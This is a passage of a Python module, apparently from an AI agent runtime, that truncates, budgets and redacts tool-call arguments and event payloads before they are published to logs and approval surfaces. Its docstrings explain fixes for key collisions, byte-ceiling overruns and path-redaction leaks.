    the *same* 160 bytes and each read as an exact, complete filename. The plan branch, three lines
    away, had the threshold and the marker. Two sites implementing "truncate but stay a string" with
    different answers is the shape that produced most of this release's defects, so they now cannot
    disagree.

    The result is at most ``budget`` bytes plus the marker, matching the bound already published for
    plan steps; the marker is deliberately outside the budget rather than eating into it, so the
    readable prefix is the same length whether or not anything was cut.
    """
    if len(value.encode("utf-8")) <= threshold:
        return value
    return truncate_to_bytes(value, budget) + TRUNCATION_SUFFIX


_TRUNCATED_KEYS = "truncated_keys"
"""The kernel's word for "this mapping is missing keys", on every surface that cuts one."""


def _publish_truncated_keys(
    published: dict[str, Any], dropped: int, budget: PayloadBudget
) -> None:
    """Add the ``truncated_keys`` marker without destroying a source key of that name.

    A model may name an argument ``truncated_keys``, and the assignment used to overwrite it: the
    argument's value vanished with no marker of its own, and the count under-reported by one,
    because the entry it replaced had already been counted as published. That is a cap that does
    not say what it capped — the exact failure this release exists to close, arriving through the
    marker meant to announce it.

    The marker keeps the plain name and the source key takes the ``#N`` suffix, which inverts
    ``_bounded_key``'s "first one wins" on purpose: the name is a contract that ``status.json``,
    the narration and the activity feed read by name, and a consumer that cannot find it reads a
    cut payload as a complete one. The argument is not lost, it is renamed — the same disambiguation
    two colliding source keys already get, so nothing here is destroyed silently.

    Nothing happens to a mapping that is not cut, so the "unchanged when nothing was dropped"
    guarantee holds: only an actual collision is disambiguated.

    Charges what it appends, marker and rename alike, which is why it takes the budget rather than
    handing the fragment back for a caller to charge. The rename widens a key the loop already paid
    for at its plain spelling, and that shortfall was invisible for a measurable reason: every
    non-empty container over-charges exactly two bytes, because each key is charged its separators
    (``", "`` plus ``": "``) while the *first* entry spells no leading comma. ``#2`` costs exactly
    that cushion and disappeared into it. ``#10`` costs one byte more, and on the approval surface
    a payload of colliding keys arrived 2,027 bytes past a ceiling this module says it cannot
    exceed. A proof that holds only while an unstated cushion happens to cover it is not the proof
    this module claims.
    """
    if dropped < 0:
        dropped = 0
    if _TRUNCATED_KEYS in published:
        collided = published.pop(_TRUNCATED_KEYS)
        suffix = 2
        while f"{_TRUNCATED_KEYS}#{suffix}" in published:
            suffix += 1
        renamed = f"{_TRUNCATED_KEYS}#{suffix}"
        _spend_terminal(budget, _fragment_cost(renamed) - _fragment_cost(_TRUNCATED_KEYS))
        published[renamed] = collided
    published[_TRUNCATED_KEYS] = dropped
    _charge_terminal_marker(budget, {_TRUNCATED_KEYS: dropped})


def _bounded_key(
    raw: str, *, threshold: int, budget: int, taken: Mapping[str, Any], _collisions: dict[str, int]
) -> str:
    """The published form of one mapping key: bounded, marked, and never silently merged.

    One function because it was two, and the second one did not exist. Bounding keys inside
    ``preview_value``'s dict branch fixed every key at depth >= 1 and left depth 0 — which is the
    *only* depth a model names directly, since the outer mapping of a tool call is built by
    ``args_preview`` and its four siblings rather than by the traversal. A 90 KB body arrived
    ``{"redacted": true}`` as a value, 162 bytes as a nested key, and verbatim as a top-level key.

    Collisions are disambiguated rather than dropped: truncation makes distinct keys equal, and a
    mapping resolves that by discarding one of them without a word — a cap that does not say it
    capped, which is the failure this release exists to close.
    """
    name = truncate_inline_text(raw, threshold=threshold, budget=budget)
    if name not in taken:
        return name
    # Probe upward from the count already recorded rather than from 2. The linear rescan was
    # quadratic at the one caller with no key-count cap -- 8000 colliding argument names took 15 s
    # inside event construction, which is a denial of service wearing a correctness fix's clothes.
    suffix = _collisions.get(name, 1) + 1
    while f"{name}#{suffix}" in taken:
        suffix += 1
    _collisions[name] = suffix
    return f"{name}#{suffix}"


def public_mapping(
    values: Mapping[str, Any],
    preview: Callable[[str, Any], Any],
    *,
    threshold: int = PREVIEW_BYTE_THRESHOLD,
    budget: int = PREVIEW_BYTE_BUDGET,
    payload_budget: PayloadBudget | None = None,
) -> dict[str, Any]:
    """Build a public mapping from ``values``, bounding the **key** as well as the value.

    Every builder whose outer mapping has *model-authored* keys goes through here, so "the key is
    model-authored text too" is stated once. ``shell_args_preview`` and ``web_args_preview`` do not:
    their outer keys are kernel literals (``command_preview``, ``env_keys``, ``url_preview``), and
    only the values they wrap come from the model. ``preview`` receives the *whole* key, not the bounded one: a 5 KB key
    ending in ``_path`` is still a path, and judging it by its truncated form would let length
    defeat the redaction.

    Deliberately not ``preview_value(key, mapping, policy)``, which would also apply
    ``PREVIEW_MAX_KEYS``. The top-level *count* cap is absent on purpose — ``narration`` and the
    activity feed read specific argument names, and dropping the 21st argument would blank them —
    and that reasoning is about count, not length. The *payload budget* does stop this loop, and
    that is not the same regression: the count cap dropped the 21st argument of every wide call,
    while the budget stops nothing until a quarter-megabyte has already been appended, and says so
    through ``truncated_keys`` when it does.

    ``payload_budget`` must be the same object the ``preview`` callback spends from — the builders
    close one budget over both — or the keys and the values are accounted on different ledgers.
    Every callback return is charged, the branches that bypass ``preview_value`` included
    (``public_result_content``'s ``content`` and ``path``, ``finish_args_preview``'s prose
    redaction): they charge themselves and hand back the same ``_DROPPED`` sentinel this loop
    already stops on. They used to be exempt, because "each is a kernel-named key producing a
    bounded fragment, so the slack is a fixed handful of bytes, not a route". Half of that was
    true. ``public_result_content`` matches ``content`` and ``path`` *exactly* — two keys, 55
    bytes. ``finish_args_preview`` matches ``key.lower()``, and a mapping holds every case variant
    as a distinct key: 160 of them, 7,664 uncharged bytes, 6,575 past the ceiling. A key the
    *model* names is not a kernel-named key, and a count nobody bounded is a route.
    """
    if payload_budget is None:
        payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)
    published: dict[str, Any] = {}
    collisions: dict[str, int] = {}
    payload_budget.charge(2)  # the braces
    stopped = False
    for key, value in values.items():
        name = _bounded_key(
            str(key), threshold=threshold, budget=budget, taken=published, _collisions=collisions
        )
        if not payload_budget.charge(_fragment_cost(name) + 4):
            stopped = True
            break
        fragment = preview(str(key), value)
        if fragment is _DROPPED:
            stopped = True
            break
        published[name] = fragment
    if stopped:
        # The top level is where an argument name is the model's to choose, so the marker's
        # collision handling matters most here: narration and the activity feed read these keys by
        # name, and overwriting one both destroyed it and under-counted the loss, because the
        # entry it replaced had already been counted as published.
        dropped_keys = len(values) - len(published)
        _publish_truncated_keys(published, dropped_keys, payload_budget)
    return published


class _Unmasked:
    """Sentinel: the mask looked at this value and declined to replace it."""

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return "UNMASKED"


UNMASKED = _Unmasked()


def preview_value(
    key: str,
    value: Any,
    policy: PermissionPolicy,
    *,
    mask: Callable[[str, Any], Any] | None = None,
    threshold: int = PREVIEW_BYTE_THRESHOLD,
    budget: int = PREVIEW_BYTE_BUDGET,
    decision_surface: bool = False,
    list_marker: bool = True,
    _payload_budget: PayloadBudget | None = None,
    _depth: int = 0,
    _ancestors: frozenset[int] = frozenset(),
) -> Any:
    """Bound a value for publication, optionally masking keys the caller names first.

    ``_payload_budget`` is the whole-payload byte ceiling this call spends from. Passing ``None``
    makes this call its *own* payload — right for the single-root builders (``artifact.emitted``'s
    ``metadata``, ``plan.updated``'s ``items``, ``public_job_artifact``'s ``cwd``), and exactly
    wrong for a builder that assembles several fields into one payload: each field would get a
    fresh allowance, which is the per-key accounting the reverted ``PREVIEW_MAX_NODES`` shipped.
    Multi-field builders create one ``PayloadBudget`` and thread it through every call.

    ``mask`` is consulted at *every* level with that level's key, and returning anything other than
    ``UNMASKED`` replaces the value outright. It exists so that the approval projection can add its
    secret- and prose-key rules to this traversal instead of running a second one:
    ``core.tool_approval.redact_tool_arguments`` had its own recursion carrying the masking rules but
    no caps, while this one had the caps but knew nothing about secrets. Which half of the policy
    applied to a value depended only on which surface it left through. One traversal, all the rules.

    ``decision_surface=True`` marks a surface a *person* reads to authorize a call, and stops this
    function withholding from them: file bodies and ``redact_patterns`` paths are shown, bounded by
    the caller's budget rather than blanked. Every other surface is a log, and the default withholds
    both. It is deliberately one switch — see ``core.tool_approval.redact_tool_arguments``.

    ``list_marker=False`` caps the list **passed in** without appending the
    ``{"truncated_items": n}`` element. Only the *caller* knows whether it is previewing a JSON blob
    (where a self-describing marker is the signal, and the default) or a **typed array** a consumer
    iterates by element shape (where the marker is a foreign object). Callers that pass ``False``
    are expected to report the drop out-of-band; ``len(original) - len(previewed)`` gives the count
    without restating the cap.

    It deliberately does **not** propagate into nested containers, which is where a first attempt
    got it wrong. Only the top-level array has the typed consumer; a list nested inside one of its
    elements is an ordinary JSON blob, and suppressing *its* marker dropped elements that the
    caller's ``len(original) - len(previewed)`` cannot see, because that only measures the root.
    The result was a silent cap -- the failure this release exists to stop -- reached by binding a
    rule to every depth on the reasoning that a rule bound at one site should be bound at its twins.
    Nested lists are not that twin.
    """
    owns_budget = _payload_budget is None
    if _payload_budget is None:
        _payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)
    result = _preview_value(
        key,
        value,
        policy,
        mask=mask,
        threshold=threshold,
        budget=budget,
        decision_surface=decision_surface,
        list_marker=list_marker,
        _payload_budget=_payload_budget,
        _depth=_depth,
        _ancestors=_ancestors,
    )
    if result is _DROPPED:
        if not owns_budget:
            # A recursive caller translates the refusal into its container's stop-and-report;
            # the sentinel must never outlive this module.
            return _DROPPED
        # A self-owned budget refusing its very first fragment takes a whole default ceiling,
        # which no real fragment reaches -- but a structural fallback beats trusting that.
        fallback = {"truncated": True, "type": type(value).__name__}
        _charge_terminal_marker(_payload_budget, fallback)
        return fallback
    return result


def _preview_value(
    key: str,
    value: Any,
    policy: PermissionPolicy,
    *,
    mask: Callable[[str, Any], Any] | None,
    threshold: int,
    budget: int,
    decision_surface: bool,
    list_marker: bool,
    _payload_budget: PayloadBudget,
    _depth: int,
    _ancestors: frozenset[int],
) -> Any:
    """The traversal behind ``preview_value``, with the payload budget always in hand.

    Every leaf-shaped return — a plain scalar, a preview envelope, a mask replacement, a
    redaction, a depth or cycle marker — passes through ``_charge_fragment`` exactly once, and the
    container branches charge the connective tissue (braces, quoted keys, separators) as they
    append it. Charged-at-least-cost per appended byte is what makes the serialized payload
    provably no larger than the budget; a refused fragment comes back as ``_DROPPED`` and the
    enclosing container stops there and says how much it dropped.
    """
    if mask is not None:
        replacement = mask(key, value)
        if replacement is not UNMASKED:
            return _charge_fragment(_payload_budget, replacement)
    lowered = key.lower()
    if not decision_surface:
        # One branch, both withholdings. They were two independent flags for one commit, and that
        # was long enough to ship the inversion: the approval card turned content redaction *off*
        # so an approver could read the body, and left path redaction *on*, so it showed a private
        # key's contents while hiding which file it was being written to. Whatever an operator
        # means by ``redact_patterns``, it is not that. A surface either withholds from its reader
        # or it does not; a caller cannot pick one half any more.
        if _is_content_field(lowered):
            return _charge_fragment(_payload_budget, redacted_value(value))
        if (
            _is_path_field(lowered)
            and isinstance(value, str)
            and _is_path_redacted(value, policy)
        ):
            return _charge_fragment(_payload_budget, redacted_value(value))
    if isinstance(value, (dict, list)) and _depth >= PREVIEW_MAX_DEPTH:
        return _charge_fragment(
            _payload_budget,
            {"truncated": True, "type": type(value).__name__, "depth_exceeded": PREVIEW_MAX_DEPTH},
        )
    if isinstance(value, (dict, list)):
        # The depth cap terminates but does not bound *cost*: a container reachable from itself is
        # re-expanded once per edge per level, so a 21-object input with 20 self-referencing keys
        # costs 20**8 nodes. Measured at fanout 7: 23 s and 377 MB of serialized JSON, from an input that fits on a
        # line. Not reachable from a `json.loads`-derived tool argument (JSON cannot express
        # sharing), but `public_result_content` previews a `ToolResult.content` built by a custom or
        # MCP tool handler in ordinary Python objects, which can.
        #
        # Ancestors on the current path, not everything seen: the same small dict appearing twice in
        # a payload is ordinary and both copies should render. Only a container containing *itself*
        # is elided, which is the case that has no faithful rendering anyway.
        if id(value) in _ancestors:
            return _charge_fragment(
                _payload_budget,
                {"truncated": True, "type": type(value).__name__, "circular": True},
            )
        _ancestors = _ancestors | {id(value)}
    if isinstance(value, dict):
        if not _payload_budget.charge(2):  # the braces
            return _DROPPED
        preview: dict[str, Any] = {}
        collisions: dict[str, int] = {}
        stopped = False
        for child_key, child_value in list(value.items())[:PREVIEW_MAX_KEYS]:
            # The key is model-authored text too, and it was the one string this function published
            # at any length: the same 30 KB file body arrived ``{"redacted": true}`` in the value
            # position and verbatim in the key position, past both the byte cap and
            # ``_is_content_field`` (which reads the key to judge the *value*, so a body moved into
            # the key has no name left to incriminate it). ``env_keys`` was routed through here for
            # exactly this reason one commit earlier -- but that bound keys arriving as list
            # *items*, and left the twin where they arrive as keys.
            name = _bounded_key(
                str(child_key), threshold=threshold, budget=budget, taken=preview, _collisions=collisions
            )
            # The quoted key and its separators are appended bytes like any others; refusing them
            # here is what stops a thousand cap-obeying entries from summing past the ceiling.
            if not _payload_budget.charge(_fragment_cost(name) + 4):
                stopped = True
                break
            # Rules still match on the *whole* key: a 5 KB key ending in ``_path`` is a path, and
            # judging it by its truncated form would let length defeat the redaction.
            child = _preview_value(
                str(child_key),
                child_value,
                policy,
                mask=mask,
                threshold=threshold,
                budget=budget,
                decision_surface=decision_surface,
                list_marker=True,
                _payload_budget=_payload_budget,
                _depth=_depth + 1,
                _ancestors=_ancestors,
            )
            if child is _DROPPED:
                stopped = True
                break
            preview[name] = child
        # One number for both cuts -- the width cap's excess and the budget's stop -- because the
        # reader's question is "how many keys am I not seeing", not which rule dropped them. A
        # source key of the marker's own name is disambiguated rather than overwritten; the note
        # this replaced called that loss acceptable because only nested dicts could width-cap and
        # no consumer reads those by key, which the payload budget made false the moment the top
        # level could cut too.
        dropped_keys = len(value) - len(preview)
        if stopped or dropped_keys > 0:
            _publish_truncated_keys(preview, dropped_keys, _payload_budget)
        return preview
    if isinstance(value, list):
        if not _payload_budget.charge(2):  # the brackets
            return _DROPPED
        # The parent key is reused for each item because list items have no key of their own. A
        # secret-named list is already masked whole before reaching here; what this carries is the
        # mask *down* to dicts inside the list, so ``{"headers": [{"api_key": ...}]}`` still masks.
        items: list[Any] = []
        for item in value[:PREVIEW_MAX_ITEMS]:
            if not _payload_budget.charge(2):  # the separator
                break
            child = _preview_value(
                key,
                item,
                policy,
                mask=mask,
                threshold=threshold,
                budget=budget,
                decision_surface=decision_surface,
                list_marker=True,
                _payload_budget=_payload_budget,
                _depth=_depth + 1,
                _ancestors=_ancestors,
            )
            if child is _DROPPED:
                break
            items.append(child)
        # The marker is a *foreign shape* in the array it is appended to. In a JSON blob that is the
        # point -- it is self-describing and the reader sees it. In a typed array it is a defect: the
        # Studio plan renderer reads ``items[].step``, so this element drew a blank row AND inflated
        # the ``n/len(plan)`` progress denominator. ``list_marker`` applies to the list passed in
        # and does *not* propagate -- see the docstring for why nested lists are not that twin.
        # (This comment used to claim the opposite, and outlived the fix that made it false.)
        # ``len(value) - len(items)`` covers the width cap's excess and the budget's stop with one
        # number; the ``list_marker=False`` caller reads the same difference off the root itself.
        if list_marker and len(value) > len(items):
            marker = {"truncated_items": len(value) - len(items)}
            _charge_terminal_marker(_payload_budget, marker)
            items.append(marker)
        return items
    if isinstance(value, str):
        encoded_len = len(value.encode("utf-8"))
        if encoded_len > threshold:
            if lowered in _INLINE_TEXT_KEYS:
                # Stays a string: a renderer prints this one directly.
                return _charge_fragment(
                    _payload_budget, truncate_inline_text(value, threshold=threshold, budget=budget)
                )
            return _charge_fragment(
                _payload_budget,
                {
                    "type": "str",
                    "preview": truncate_to_bytes(value, budget),
                    "bytes": encoded_len,
                    "truncated": True,
                },
            )
        return _charge_fragment(_payload_budget, value)
    if isinstance(value, bool) or value is None:
        return _charge_fragment(_payload_budget, value)
    if isinstance(value, int):
        # The one JSON scalar whose spelling is unbounded. Up to the threshold it keeps its type
        # — the ``artifact.emitted.kind`` precedent: schema-typed neighbours must not change shape
        # for ordinary values — and past it, the string envelope's sibling. The ``preview`` is
        # spelled in hex because hex is linear-time and exempt from the interpreter's decimal
        # digit limit, which a ≥4301-digit value (reachable only through Python-object ingress
        # ahead of the refusing boundaries) would trip; ``int.__index__`` is the base slot, so a
        # subclass's ``__format__`` is never consulted.
        if _int_spelling_exceeds(value, threshold):
            return _charge_fragment(
                _payload_budget,
                {
                    "type": "int",
                    "preview": _int_hex_preview(value, budget),
                    "truncated": True,
                },
            )
        return _charge_fragment(_payload_budget, value)
    if isinstance(value, float):
        # Bounded by construction: a finite float's JSON spelling is ~24 bytes, and non-finite
        # floats are substituted at semantic ingress before any payload is built.
        return _charge_fragment(_payload_budget, value)
    # Everything else — bytes, Decimal, arbitrary objects — is named by type and never asked to
    # speak: no ``repr``, no ``str``, no ``len``. A hostile ``__repr__`` would run inside event
    # construction, and a large integer subclass's decimal spelling would raise. The refusing
    # ingress boundaries (tool results, artifact metadata, task payloads) are the primary defence;
    # this is what any traversal-shaped route that skips them still gets, instead of the value
    # riding whole into a writer that cannot spell it.
    return _charge_fragment(
        _payload_budget, {"truncated": True, "type": type(value).__name__}
    )


def _is_path_redacted(value: str, policy: PermissionPolicy) -> bool:
    """``policy.is_path_redacted``, but a path that cannot be normalized counts as redacted.

    ``is_path_redacted`` normalizes before matching, and normalization *raises* on an absolute path
    or a ``..`` traversal — both of which a model can put in a ``path`` argument. Left to propagate,
    that ends the run from inside event construction: the preview builders sit on the emit path, and
    ``WorkspaceError`` escaping there kills a run for an operator whose only mistake was configuring
    ``redact_patterns``. Fail closed rather than open: an argument that does not name a workspace
    path is precisely the kind that should not be published verbatim.
    """
    try:
        return policy.is_path_redacted(value)
    except WorkspaceError:
        # Fail closed, for every path-naming field. Scoping this to ``path``/``root``/``cwd`` --
        # to stop a task result's absolute ``report_path`` being blanked by an unrelated pattern --
        # re-opened the leak it was meant to leave closed: ``normalize_workspace_path`` raises on any
        # ``..`` component *before* resolving it, so ``x/../secrets/creds.txt`` raises while naming a
        # path the operator's pattern matches, and was then published verbatim next to
        # ``paths: ["[redacted-path]"]`` on the same event. Both failure modes are real; only one is
        # silent. An over-redacted field says ``{"redacted": true}`` and an operator can see it and
        # widen the glob, while an under-redacted one looks exactly like a field that was checked.
        return True


def redacted_value(value: Any) -> dict[str, Any]:
    if isinstance(value, str):
        return {"redacted": True, "type": "str", "bytes": len(value.encode("utf-8"))}
    if isinstance(value, bytes):
        return {"redacted": True, "type": "bytes", "bytes": len(value)}
    return {"redacted": True, "type": type(value).__name__}


def public_event_payload(data: Mapping[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Bound every value in an event payload a service assembled by hand.

    The ``*_args_preview`` builders bound what reaches ``tool.call.started``, and services then
    built their *own* payloads for the events they emit either side of it — ``to_public_json`` at
    seven emit sites covering six shell event types, an inline ``event_data`` in each of the three
    web builders. Same model-authored
    values, same run, one of them capped: a 20 KB ``env`` key or ``blocked_domains`` entry was
    published verbatim on ``tool.approval.requested`` while ``args_preview`` reduced it to a
    preview, and a ``cwd`` under ``redact_patterns`` came out ``{"redacted": true}`` on one event
    and as the path on the next.

    These payloads are declared ``additionalProperties: true`` JSON blobs with no typed renderer,
    so the self-describing ``{"truncated_items": n}`` marker is the right default here — the
    argument that kept it out of ``plan.updated.items`` was about a consumer reading
    ``items[].step``, and nothing reads these by element shape.
    """
    payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)
    return public_mapping(
        data,
        lambda key, value: preview_value(key, value, policy, _payload_budget=payload_budget),
        payload_budget=payload_budget,
    )


def touches_redacted_path(values: Mapping[str, Any], policy: PermissionPolicy) -> bool:
    """True if any argument in ``values`` is a path the operator's ``redact_patterns`` matches.

    Exists so the decision surface can drop its exemption *as a whole*. ``preview_value`` sees one
    key at a time and cannot know that the ``content`` it is about to show belongs to a call whose
    ``path`` the operator marked secret; this sees the whole argument map, which is the only level
    where that question can be answered.

    **Recurses, because ``preview_value`` does.** Checking only ``values.items()`` made this the
    shallower half of a pair that has to agree: a redacted path one level down — inside
    ``artifact.emit``'s ``metadata``, which is declared ``additionalProperties: true`` and so
    survives argument validation — neither triggered the escape hatch nor got redacted by the
    traversal, because ``decision_surface`` had switched that off. It was published verbatim where
    the release before this one had rendered ``{"redacted": true}``: a fix that made one field more
    exposed than it found it. Lists are walked for the same reason; a ``str``-only check missed
    ``{"source_path": ["secrets/creds.txt"]}``.
    """

    seen: set[tuple[int, str]] = set()

    def walk(value: Any, key: str, depth: int) -> bool:
        # The same ancestor guard `preview_value` uses. Without it this re-expanded a
        # self-referencing container, and it runs *before* `preview_value` -- so the guard three
        # functions away never got a chance to fire. A set rather than a frozenset chain because
        # this only answers yes/no: nothing is rendered, so eliding a legitimately shared value
        # costs nothing here, unlike in the preview.
        # ``depth`` counts the same way ``preview_value``'s ``_depth`` does: the outer mapping is
        # not a level, so a top-level value is 0. Counting the mapping itself made this stop one
        # level *earlier* than the traversal it has to agree with, and `preview_value`'s depth cap
        # only blocks containers -- so a string at the boundary was still previewed and published
        # while this had already given up on it. A matched path and a file body both rode out.
        #
        # Checked *before* the ancestor bookkeeping below, not after. Recording a container that was
        # rejected for depth marks it answered-no permanently, so the same container reached later
        # at a shallower depth -- where it would have been walked -- short-circuits to False. The
        # guard against re-expansion became a guard against detection.
        if depth > PREVIEW_MAX_DEPTH:
            return False
        if isinstance(value, (Mapping, list)):
            # Keyed on (identity, inherited key), not identity alone. A *list* takes its key from
            # the parent, so the same list reached under `other` and under `source_path` answers
            # differently -- an identity-only set would let the first, negative visit suppress the
            # second. Not reachable from JSON-derived arguments, which cannot share, but the guard
            # should not be the thing that introduces a miss.
            if (id(value), key) in seen:
                return False
            seen.add((id(value), key))
        if isinstance(value, Mapping):
            return any(walk(item, str(child), depth + 1) for child, item in value.items())
        if isinstance(value, list):
            # The parent key carries down: list items have no key of their own, which is the same
            # reason ``preview_value`` reuses it.
            return any(walk(item, key, depth + 1) for item in value)
        lowered = key.lower()
        return (
            _is_path_field(lowered)
            and isinstance(value, str)
            and _is_path_redacted(value, policy)
        )

    return any(walk(value, str(key), 0) for key, value in values.items())


def _is_path_field(lowered_key: str) -> bool:
    # Which arguments carry a workspace path is declared per tool by ``ToolSpec.path_args``, not by
    # this module -- and ``fs.move``/``fs.copy`` declare ``("source_path", "destination_path")``.
    # Matching a hardcoded ``{"path", "root", "cwd"}`` meant one ``fs.move`` published
    # ``paths: ["[redacted-path]"]`` next to ``args_preview.source_path: "secrets/creds.txt"`` on
    # the *same event*: the operator's redaction defeated by the field beside it.
    #
    # Matched by name rather than by consulting the registry because this function also previews
    # values that never were a tool argument (result payloads, artifact metadata, capability
    # descriptors), where there is no ``ToolSpec`` to ask -- and because a custom or MCP tool that
    # names an argument ``*_path`` is then covered without registering anything here.
    return lowered_key in {"path", "root", "cwd"} or lowered_key.endswith("_path")



def _is_content_field(lowered_key: str) -> bool:
    # File-content fields are kept out of the public event stream; full content
    # lives only in the private transcript/proposal artifacts. Secret redaction
    # beyond this (and PermissionPolicy.redact_patterns) is the integrator's job.
    return lowered_key in {"content", "old", "new", "old_text", "new_text"}
